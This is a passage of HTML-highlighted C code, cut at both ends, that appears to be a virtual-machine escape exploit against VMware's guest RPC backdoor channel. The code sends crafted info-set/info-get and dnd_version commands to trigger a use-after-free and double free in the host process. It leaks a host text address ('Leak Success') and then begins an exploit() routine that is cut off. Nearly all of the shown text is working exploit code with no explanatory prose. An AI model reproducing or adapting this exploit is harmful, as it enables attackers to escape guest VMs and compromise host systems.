string">"movl %%ecx,(%%r10)\n\t"</span>        <span class="token operator">:</span>        <span class="token operator">:</span>        <span class="token operator">:</span><span class="token string">"%rax"</span><span class="token punctuation">,</span><span class="token string">"%rbx"</span><span class="token punctuation">,</span><span class="token string">"%rcx"</span><span class="token punctuation">,</span><span class="token string">"%rdx"</span><span class="token punctuation">,</span><span class="token string">"%rsi"</span><span class="token punctuation">,</span><span class="token string">"%rdi"</span><span class="token punctuation">,</span><span class="token string">"%r10"</span>       <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">struct</span> <span class="token class-name">channel</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> cookie1<span class="token punctuation">;</span>    <span class="token keyword">int</span> cookie2<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> heap <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span> text <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">run_cmd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> tmp<span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token punctuation">,</span>len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">,</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_close</span><span class="token punctuation">(</span>tmp<span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>tmp<span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to close channel\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>      <span class="token keyword">char</span> pay<span class="token punctuation">[</span><span class="token number">8192</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s2 <span class="token operator">=</span> <span class="token string">"info-get guestinfo.a"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s21<span class="token operator">=</span> <span class="token string">"info-get guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s3 <span class="token operator">=</span> <span class="token string">"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s4 <span class="token operator">=</span> <span class="token string">"tools.capability.dnd_version 4"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s5 <span class="token operator">=</span> <span class="token string">"vmx.capability.dnd_version"</span><span class="token punctuation">;</span>    <span class="token comment">//init data</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//first step </span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//strlen(s21) = 0x100</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s21<span class="token punctuation">)</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv len:%d\n"</span><span class="token punctuation">,</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%s\n"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//second step free the reply and let the other channel get it.</span>    <span class="token function">channel_open</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span><span class="token operator">&amp;</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to open channel!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to set len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token function">strlen</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span>s2<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//free the output buffer</span>    <span class="token comment">//printf("Freeing the buffer....,bp:0x5555556DD3EF\n");</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now let's free\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"then alloc channel 1\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//finished sending the command, should get the freed buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_send_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>s2<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to send data\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check if channel 1's buffer == channel 0's buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//third step,free it again</span>    <span class="token comment">//set status to be 4</span>    <span class="token comment">//free the output buffer</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Free the buffer again...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">channel_set_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token number">0xffff</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv finish2\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"check the heap, our target buffer in tcache now!\nTrying to reuse the buffer as a struct, which we can leak..\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">run_cmd</span><span class="token punctuation">(</span>s5<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Should be done.Check the buffer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span>    <span class="token function">channel_recv_reply_len</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>len<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>res<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"fail to recv data len\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">channel_recv_data</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span>i<span class="token punctuation">,</span>data<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">+=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"recv data:%lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    text <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>data<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xf818d0</span><span class="token punctuation">;</span>    <span class="token function">channel_recv_finish</span><span class="token punctuation">(</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie1<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>cookie2<span class="token punctuation">,</span>chan<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>num<span class="token punctuation">,</span><span class="token operator">&amp;</span>res<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leak Success\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//the exploit step is almost the same as the leak ones</span>    <span class="token keyword">struct</span> <span class="token class-name">channel</span> chan<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len<span class="token punctuation">,</span>i<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>data<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>s1 <span class="token operator">=</span> <span class="token string">"info-set guestinfo.b 